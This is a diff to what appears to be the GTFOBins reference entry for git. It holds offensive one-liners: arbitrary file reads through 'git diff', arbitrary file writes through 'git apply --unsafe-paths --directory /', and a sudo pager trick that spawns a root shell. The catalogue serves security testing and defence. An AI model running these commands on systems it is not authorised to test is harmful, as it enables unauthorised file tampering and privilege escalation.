@@ -27,30 +27,9 @@ functions:
         LFILE=file_to_read
         git diff /dev/null $LFILE
   file-write:
-    - description: Git apply writes to files specified in the patch when supplied with a directory and the flag `--unsafe-paths`. Patch file must be in the valid format. This creates a new file with two lines.
+    - description: The patch can be created locally by creating the file that will be written on the target using its absolute path, then `git diff /dev/null /path/to/file >x.patch`.
       code: |
-        TF=$(mktemp -d)
-        LFILE=file_to_write
-        echo "--- /dev/null" > "$TF/temp.patch"
-        echo "+++ b$LFILE" >> "$TF/temp.patch"
-        echo "@@ -0,0 +1,2 @@" >> "$TF/temp.patch"
-        echo "+ line_1_content" >> "$TF/temp.patch"
-        echo "+ line_2_content" >> "$TF/temp.patch"
-        git apply "$TF/temp.patch" --directory / --unsafe-paths
-    - description: This removes a line from an existing file and adds a new line.
-      code: |
-        TF=$(mktemp -d)
-        LFILE=file_to_write
-        echo "--- a$LFILE" > "$TF/temp.patch"
-        echo "+++ b$LFILE" >> "$TF/temp.patch"
-        echo "@@ -1,4 +1,4 @@" >> "$TF/temp.patch"
-        echo " this is a test" >> "$TF/temp.patch"
-        echo " with multiple lines" >> "$TF/temp.patch"
-        echo "-this line will be removed" >> "$TF/temp.patch"
-        echo " this line will have another after" >> "$TF/temp.patch"
-        echo "+a new line" >> "$TF/temp.patch"
-        git apply "$TF/temp.patch" --directory / --unsafe-paths
-        
+        git apply --unsafe-paths --directory / x.patch
   sudo:
     - code: sudo PAGER='sh -c "exec sh 0<&1"' git -p help
     - description: This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.
